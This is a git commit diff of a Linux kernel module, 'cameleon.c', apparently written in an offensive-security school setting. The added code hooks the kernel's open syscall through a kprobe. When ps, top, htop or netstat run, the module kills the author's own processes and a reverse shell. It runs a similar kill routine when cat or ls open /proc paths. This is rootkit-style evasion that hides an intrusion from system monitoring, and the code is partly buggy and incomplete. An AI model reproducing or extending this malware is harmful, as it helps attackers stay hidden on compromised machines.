d0ade99f9c22b4628a2c0569db6ed53942f18942
Juillard Thibault <thibault.juillard@ecole2600.com>
2024-11-23 00:17:30 +0100

    update cameleon.c

--- mesmodules/cameleon.c
+++ mesmodules/cameleon.c
@@ -11,12 +11,14 @@
 #include <net/sock.h>
 #include <linux/fdtable.h>   // Pour struct fdtable et files_fdtable
 #include <linux/spinlock.h>  // Pour spin_lock et spin_unlock
+#define MAX_PATH_BUFFER PATH_MAX
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("tibo.wav");
 MODULE_DESCRIPTION("Hook __x64_sys_open using kprobes");
 
 static struct kprobe kp;
+static char path_buffer[MAX_PATH_BUFFER];
 
 /* Fonction pour rechercher nos processus visible via ps */
 static void find_and_kill_our_processes(void) {
@@ -57,7 +59,7 @@ static void find_and_kill_our_processes(void) {
 	}
 }
 
-/* Fonction pour rechercher et tuer le reverse shell */
+/* Fonction pour rechercher et tuer le reverse shell */ //marche pas 
 static void find_and_kill_reverse_shell(void) {
 	struct task_struct *task;
 	for_each_process(task) {
@@ -72,14 +74,47 @@ static void find_and_kill_reverse_shell(void) {
 	}
 }
 
+/* Fonction pour rechercher et tuer les processus liés à /proc */
+static void if_its_related_to_proc_we_kill(void) {
+	if (current->files) {
+		pr_info("[+] Found files field in current task\n");
+		struct fdtable *fdt = files_fdtable(current->files);
+		if (fdt) {
+			pr_info("[+] Found fdtable\n");
+			for (int i = 0; i < fdt->max_fds; i++) {
+				struct file *file = fdt->fd[i];
+				if (file) {
+					pr_info("[+] Found file in fdtable\n");
+					pr_info("[+] File: %s\n", file->f_path.dentry->d_iname);
+					pr_info("[+] File: %s\n", file->f_path.dentry->d_name.name);
+					char *tmp = d_path(&file->f_path, path_buffer, PATH_MAX);
+					pr_info("[+] Found file: %s\n", tmp);
+					if (tmp) {
+						if (strstr(tmp, "/proc/") != NULL) {
+							pr_info("[+] Found file related to /proc: %s\n", tmp);
+							pr_info("[+] Killing process with PID: %d, name: %s\n", current->pid, current->comm);
+							find_and_kill_our_processes();
+						}
+					}
+					path_buffer[0] = '\0';
+				}
+			}
+		}
+	}
+}
+
 /* Handler pour la fonction hookée (__x64_sys_open) */
 static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
     /* pr_info("[+] Hooked __x64_sys_open! PID: %d, name: %s", current->pid, current->comm); */
-    if (strcmp(current->comm, "ps") == 0) {
+	if (strcmp(current->comm, "ps") == 0 || strcmp(current->comm, "top") == 0 || strcmp(current->comm, "htop") == 0) {
     	find_and_kill_our_processes();
     } 
 	if (strcmp(current->comm, "netstat") == 0) {
 		find_and_kill_reverse_shell();
+	}
+	if (strcmp(current->comm, "cat") == 0 || strcmp(current->comm, "ls") == 0 || strcmp(current->comm, "cd") == 0) {
+		pr_info("[+] Its cat\n");
+		if_its_related_to_proc_we_kill();
 	}
     return 0;
 }
